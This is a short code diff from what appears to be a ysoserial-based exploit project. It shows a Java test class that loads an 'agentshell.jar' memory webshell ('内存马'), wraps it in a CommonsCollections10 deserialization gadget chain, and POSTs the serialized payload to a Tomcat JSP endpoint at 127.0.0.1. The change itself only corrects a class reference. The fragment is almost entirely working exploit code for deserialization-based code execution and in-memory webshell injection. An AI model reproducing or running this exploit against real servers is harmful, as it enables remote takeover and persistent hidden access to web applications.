@@ -40,7 +40,7 @@ import ysoserial.payloads.util.ReadWrite;
 public class Test {
     public static void main(String[] args) throws Exception{
         String url = "http://127.0.0.1:8080/tomcattest/test.jsp";
-        byte[] jarContent = ReadWrite.readResource(Test2.class,"内存马/agentshell.jar");
+        byte[] jarContent = ReadWrite.readResource(Test.class,"内存马/agentshell.jar");
         Object o = new AgentShell().getObject(CommonsCollections10.class,jarContent,"/tmp/2.jar");
         byte[] ser = Serializer.serialize(o);
         new HttpRequest(url).addPostData(ser).send();
